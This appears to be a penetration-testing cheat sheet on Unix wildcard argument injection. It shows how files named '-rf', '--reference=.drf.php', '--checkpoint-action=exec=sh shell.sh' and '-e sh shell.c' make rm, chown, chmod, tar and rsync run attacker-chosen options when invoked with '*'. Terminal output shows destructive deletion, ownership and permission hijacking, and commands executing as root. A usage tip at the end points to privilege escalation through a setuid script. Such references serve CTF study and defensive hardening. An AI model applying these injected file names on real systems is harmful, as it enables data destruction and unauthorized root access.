## Wildcards

| Char | Description    |
| :--  | :------------- |
| *    |  Any number of characters, including none. |
| ?    |  Any single character. |
| [ ]  |  Set of characters, any one of which may match a single character at that position. |
| -    |  Used within [ ] denotes a range of characters. |
| ~    |  At the beginning of a word expands to the name of your home directory.  If you append another user's login name to the character, it refers to that user's home directory. |

### Using wildcard to inject arguments

```
# ls -al
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file1.txt
-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file2.txt
-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf

# rm *
# ls -al
-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf

# strace rm *
execve("/bin/rm", ["rm", "DIR1", "DIR2", "file1.txt", "file2.txt", "-rf"], [/* 25 vars */]) = 0
```

### chown

```
--reference=RFILE
          use RFILE's owner and group rather than specifying OWNER:GROUP values
```

```
# ls -la
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php

# chown -R nobody:nobody *.php

# ls -la
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
```

### chmod

```
--reference=RFILE
              use RFILE's mode instead of MODE values
```

```
# ls -la
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php

# chmod 000 *

# ls -la
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
```

### tar command Execution

```
--checkpoint[=NUMBER]
    display progress messages every NUMBERth record (default 10)

--checkpoint-action=ACTION
    execute ACTION on each checkpoint
```

```
# ls -la
-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

#  tar cf archive.tar *
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### Rcync command Execution

```
-e, --rsh=COMMAND           specify the remote shell to use
    --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```
# ls -al
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

# rsync -t *.c foo:src/
rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]

# ls -al
-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

# cat shell.c
/usr/bin/id > shell_output.txt

# cat shell_output.txt
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

### Practice

- HTB - Joker

### Usage

- Create a script, setuid bit and then use this attack to `chown` the script to gain prev-esc
